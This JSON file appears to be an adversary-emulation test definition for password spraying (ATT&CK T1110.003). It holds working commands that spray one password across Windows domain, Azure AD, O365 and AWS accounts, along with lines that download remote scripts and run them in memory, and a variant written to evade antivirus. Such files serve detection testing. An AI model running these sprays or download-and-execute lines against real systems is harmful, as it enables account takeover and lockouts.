{
  "attack_technique": "T1110.003",
  "display_name": "Brute Force: Password Spraying",
  "atomic_tests": [
    {
      "name": "Password Spray all Domain Users",
      "description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": false,
        "procedure": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"#{password}\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\IPC$ > NUL"
      },
      "input_arguments": [
        {
          "arg_name": "password",
          "description": "The password to try for each user in users.txt",
          "type": "string",
          "default": "Spring2020"
        }
      ],
      "dependencies": [
        {
          "description": "List of domain users to password spray must exits at %temp%\\users.txt",
          "prereq_command": "if not exist %temp%\\users.txt (exit /b 1)",
          "get_prereq_command": "\"PathToAtomicsFolder\\T1110.003\\src\\parse_net_users.bat\""
        }
      ],
      "auto_generated_guid": "90bc2e54-6c84-47a5-9439-0a2a92b4b175"
    },
    {
      "name": "Password Spray (DomainPasswordSpray)",
      "description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force"
      },
      "input_arguments": [
        {
          "arg_name": "domain",
          "description": "Domain to brute force against",
          "type": "string",
          "default": "$Env:USERDOMAIN"
        }
      ],
      "auto_generated_guid": "263ae743-515f-4786-ac7d-41ef3a0d4b2b"
    },
    {
      "name": "Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos)",
      "description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "if (\"#{auth}\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"#{domain}\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = '#{password}'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"#{domain}\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})\n  try {\n    Write-Host \" [-] Attempting ${password} on account ${user}.\"\n    $conn.bind()\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n    Write-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\""
      },
      "input_arguments": [
        {
          "arg_name": "password",
          "description": "single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
          "type": "string",
          "default": "P@ssw0rd!"
        },
        {
          "arg_name": "domain",
          "description": "Domain FQDN",
          "type": "string",
          "default": "$env:UserDnsDomain"
        },
        {
          "arg_name": "auth",
          "description": "authentication method to choose between \"NTLM\" and \"Kerberos\"",
          "type": "string",
          "default": "NTLM"
        }
      ],
      "auto_generated_guid": "f14d956a-5b6e-4a93-847f-0c415142f07d"
    },
    {
      "name": "Password spray all Azure AD users with a single password",
      "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.",
      "supported_platforms": [
        "azure-ad"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{valid_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{valid_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n    Write-Host \" [-] Attempting #{password} on account ${user}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] ${user}:#{password} are valid credentials!`r`n\"\n    Disconnect-AzureAD > $null\n  } catch {\n    Write-Host \" [-] ${user}:#{password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\""
      },
      "input_arguments": [
        {
          "arg_name": "password",
          "description": "Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)",
          "type": "string",
          "default": "P@ssw0rd!"
        },
        {
          "arg_name": "valid_username",
          "description": "Valid username to retrieve Azure AD users. We encourage users running this atomic to add a valid microsoft account domain; for eg <valid_test_user>@<valid_ms_account.com>",
          "type": "string",
          "default": "bruce.wayne@contoso.com"
        },
        {
          "arg_name": "valid_password",
          "description": "Valid password to authenticate as valid_username in the <valid_ms_account>",
          "type": "string",
          "default": "iamthebatman"
        }
      ],
      "dependencies": [
        {
          "description": "AzureAD module must be installed.",
          "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}",
          "get_prereq_command": "Install-Module -Name AzureAD -Force"
        }
      ],
      "auto_generated_guid": "a8aa2d3e-1c52-4016-bc73-0f8854cfa80a"
    },
    {
      "name": "WinPwn - DomainPasswordSpray Attacks",
      "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords"
      },
      "input_arguments": [],
      "auto_generated_guid": "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82"
    },
    {
      "name": "Password Spray Invoke-DomainPasswordSpray Light",
      "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt"
      },
      "input_arguments": [
        {
          "arg_name": "user_limit",
          "description": "The max number of users to put in the list when running the prereq_command",
          "type": "integer",
          "default": "200"
        },
        {
          "arg_name": "password",
          "description": "The password to try for each user in users.txt",
          "type": "string",
          "default": "Spring2020"
        }
      ],
      "dependencies": [
        {
          "description": "Username file must exist at $env:Temp\\usersdpsLight.txt",
          "prereq_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}",
          "get_prereq_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\""
        }
      ],
      "auto_generated_guid": "b15bc9a5-a4f3-4879-9304-ea0011ace63a"
    },
    {
      "name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)",
      "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.",
      "supported_platforms": [
        "azure-ad"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\""
      },
      "input_arguments": [
        {
          "arg_name": "password",
          "description": "Single password to try against the list of user accounts",
          "type": "string",
          "default": "P@ssword1"
        },
        {
          "arg_name": "user_list",
          "description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)",
          "type": "string",
          "default": "$env:temp\\T1110.003UserList.txt"
        }
      ],
      "dependencies": [
        {
          "description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.",
          "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\""
        }
      ],
      "auto_generated_guid": "f3a10056-0160-4785-8744-d9bd7c12dc39"
    },
    {
      "name": "Password Spray using Kerbrute Tool",
      "description": "Test a single password against a list of users",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132"
      },
      "input_arguments": [
        {
          "arg_name": "domaincontroller",
          "description": "Domain controller where test will be run",
          "type": "string",
          "default": "$ENV:userdnsdomain"
        },
        {
          "arg_name": "domain",
          "description": "Domain where you will be testing",
          "type": "string",
          "default": "$ENV:userdomain"
        }
      ],
      "dependencies": [
        {
          "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads",
          "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\""
        },
        {
          "description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads",
          "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}",
          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\""
        }
      ],
      "auto_generated_guid": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb"
    },
    {
      "name": "AWS - Password Spray an AWS using GoAWSConsoleSpray",
      "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/",
      "supported_platforms": [
        "iaas:aws"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray",
        "procedure": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt"
      },
      "input_arguments": [
        {
          "arg_name": "aws_account_id",
          "description": "ID of the AWS account",
          "type": "string",
          "default": "XXXXXXXX"
        }
      ],
      "dependencies": [
        {
          "description": "Check if go is installed",
          "prereq_command": "go version",
          "get_prereq_command": "echo Install GO"
        }
      ],
      "auto_generated_guid": "9c10d16b-20b1-403a-8e67-50ef7117ed4e"
    }
  ]
}